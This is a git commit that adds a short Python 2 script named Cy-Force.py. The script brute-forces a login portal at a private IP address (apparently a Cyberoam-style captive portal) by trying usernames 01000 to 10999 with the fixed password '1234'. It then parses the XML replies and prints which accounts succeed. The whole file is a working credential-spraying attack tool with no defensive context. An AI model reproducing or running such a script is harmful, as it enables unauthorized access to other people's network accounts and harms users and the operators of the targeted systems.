805bd9b98674ff85357eb00498020f011da402c4
yashv28 <yashv28@gmail.com>
2015-08-10 04:35:05 +0530

    Create Cy-Force.py

---
+++ Cy-Force.py
@@ -0,0 +1,19 @@
+import sys,urllib,urllib2,time
+from xml.dom.minidom import parseString
+url='https://172.16.1.1:8090'
+password="1234"
+for x in range(1000,11000):
+    if x<10000:
+        x="0"+str(x)
+    data = {"mode":"191","username":x,"password":password}
+    content=urllib2.urlopen(url + "/login.xml", urllib.urlencode(data) , timeout=3)
+    data=content.read()
+    simple=parseString(data)
+    mtag=simple.getElementsByTagName('message')[0].toxml()
+    message=mtag.replace('<message>','').replace('</message','').replace('<message/>','')
+    failmssg="<![CDATA[The system could not log you on. Make sure your password is correct]]>>"
+    if message==failmssg:
+        print "{0} - f".format(x)
+    else:
+        print "{0} - success".format(x)
+        
